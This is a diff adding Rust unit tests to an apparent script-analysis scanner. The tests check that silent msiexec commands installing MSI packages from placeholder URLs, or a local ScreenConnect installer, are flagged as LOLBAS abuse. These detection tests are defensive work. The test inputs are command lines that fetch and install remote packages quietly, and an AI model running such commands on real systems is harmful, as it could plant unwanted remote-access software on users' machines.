@@ -14201,6 +14201,40 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     }
 
     #[test]
+    fn msiexec_attached_administrative_install_url_in_deob_text_emits_typed_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let url = "https://msiexec-admin-deob.example/setup.msi";
+        let line = format!(r#"msiexec /quiet /a{url}"#);
+        crate::deob_scan::scan_deob_text(&line, &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { url: got, .. } if got == url
+            )),
+            "msiexec attached /a package URL not typed: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Lolbas { name, cmd } if name == "msiexec" && cmd == &line
+                )
+            }),
+            "msiexec attached /a package URL not marked as LOLBAS: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "msiexec attached /a URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn msiexec_schemeless_package_url_in_deob_text_emits_typed_trait() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
@@ -14305,6 +14339,56 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
         assert!(
             has,
             "direct msiexec attached URL argument not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn msiexec_administrative_install_url_emits_typed_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::interp::interpret_line(
+            r#"msiexec /quiet /ahttps://msiexec-admin.example/setup.msi"#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { url, .. }
+                    if url == "https://msiexec-admin.example/setup.msi"
+            )),
+            "msiexec /a attached URL argument not typed: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Lolbas { name, cmd } if name == "msiexec" && cmd.contains("/a")
+                )
+            }),
+            "msiexec /a URL not marked as LOLBAS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn msiexec_local_administrative_install_emits_lolbas_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::interp::interpret_line(
+            r#"msiexec /a "C:\Users\Public\ScreenConnect.ClientSetup.msi" /qn"#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Lolbas { name, cmd }
+                        if name == "msiexec" && cmd.contains("ScreenConnect.ClientSetup.msi")
+                )
+            }),
+            "msiexec local /a package did not emit LOLBAS trait: {:?}",
             env.traits
         );
     }
